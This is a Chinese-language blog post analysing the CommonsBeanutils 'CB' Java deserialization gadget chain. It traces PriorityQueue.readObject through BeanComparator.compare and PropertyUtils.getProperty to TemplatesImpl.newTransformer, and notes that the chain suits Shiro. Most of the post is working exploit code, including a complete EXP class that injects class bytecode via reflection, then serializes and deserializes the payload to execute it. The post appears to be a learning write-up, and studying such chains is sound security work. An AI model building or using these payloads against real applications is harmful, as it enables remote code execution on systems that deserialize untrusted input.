---
layout: post
title: CommonsBeanUtils CB链
tags: Java
---

Shiro的链子不能用数组,可以用刀这个链子.学习一下

# 链分析

CommonsBeanutils 是应用于 javabean 的工具，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法

里面有个`PropertyUtils.getProperty`方法,该方法跟`.getName`类似.

```java
public class Person {
    private String name;
    private int age;

    public String getName() { return this.name; }
    public void setName(String name) { this.name = name; }

    public int getAge() { return this.age; }
    public void setAge(int age) { this.age = age; }

    public boolean isChild() {
        return age <= 6;
    }
}
```

这里的`getter`和`setter`这种 class 就是 JavaBean.

CC4的链子:

```
    TemplatesImpl#newTransformer()
        TemplatesImpl#getTransletInstance()
            TemplatesImpl#defineTransletClasses()
                TransletClassLoader#defineClass()
```

上半部分和CC4一样

```
    public static void main(String[] args) throws IllegalAccessException, IOException, NoSuchFieldException, TransformerConfigurationException, ClassNotFoundException {
        TemplatesImpl templates = new  TemplatesImpl();
        Class c = templates.getClass();
        Field nameField = c.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"admin");

        Field bytecodeField = c.getDeclaredField("_bytecodes");
        bytecodeField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\桌面\\note\\ClassLoaderTest.class\\"));
        byte[][] codes = {code};
        bytecodeField.set(templates,codes);


        Field tfactoryField = c.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());
        templates.newTransformer();
```

![image-20240926182354328](\images\posts\CommonsBeanUtils CB链\image-20240926182354328.png)

在`TemplatesImpl`的`getOutputProperties`方法调用了`newTransformer`.而`newTransformer`符合`getProperty`调用的写法

(加get,i将首字母大写).所以用`PropertyUtils.getProperty(templates,"outputProperties");`直接去调用也可以直接执行命令

```
   public static void main(String[] args) throws IllegalAccessException, IOException, NoSuchFieldException, TransformerConfigurationException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException {
        TemplatesImpl templates = new  TemplatesImpl();
        Class c = templates.getClass();
        Field nameField = c.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"admin");

        Field bytecodeField = c.getDeclaredField("_bytecodes");
        bytecodeField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\桌面\\note\\ClassLoaderTest.class\\"));
        byte[][] codes = {code};
        bytecodeField.set(templates,codes);


        Field tfactoryField = c.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());
//        templates.newTransformer();

        PropertyUtils.getProperty(templates,"outputProperties");
```

![image-20240926213247711](\images\posts\CommonsBeanUtils CB链\image-20240926213247711.png)

继续查找调用`getProperty`.在`BeanComparator`中的`compare`方法调用了`getProperty`.这里找到`compare`是因为之前CC4链的`TransformingComparator`也调用了`compare`方法.是`PriorityQueue`的`readObject`调用的.后面的反射把值改回去就跟之前的CC2和CC4是一个意思.

# EXP

```Java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;
import javax.xml.transform.TransformerConfigurationException;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CB {

    public static void main(String[] args) throws IllegalAccessException, IOException, NoSuchFieldException, TransformerConfigurationException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException {
        TemplatesImpl templates = new  TemplatesImpl();
        Class c = templates.getClass();
        Field nameField = c.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"admin");

        Field bytecodeField = c.getDeclaredField("_bytecodes");
        bytecodeField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\桌面\\note\\ClassLoaderTest.class\\"));
        byte[][] codes = {code};
        bytecodeField.set(templates,codes);

//
//        Field tfactoryField = c.getDeclaredField("_tfactory");
//        tfactoryField.setAccessible(true);
//        tfactoryField.set(templates, new TransformerFactoryImpl());
//        templates.newTransformer();

//        PropertyUtils.getProperty(templates,"outputProperties");

        BeanComparator comparator = new BeanComparator();

        PriorityQueue priorityQueue = new PriorityQueue<>(comparator);

        priorityQueue.add(1);
        priorityQueue.add(2);


        Class priorityQueueClass = priorityQueue.getClass();
        Field declaredField = priorityQueueClass.getDeclaredField("queue");
        declaredField.setAccessible(true);
        declaredField.set(priorityQueue,new Object[]{templates,templates});

        Class comparatorClass = comparator.getClass();
        Field declaredField1 = comparatorClass.getDeclaredField("property");
        declaredField1.setAccessible(true);
        declaredField1.set(comparator,"outputProperties");


        serialize(priorityQueue);
        unserialize("CCTest1.txt");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("CCTest1.txt"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }
}

```

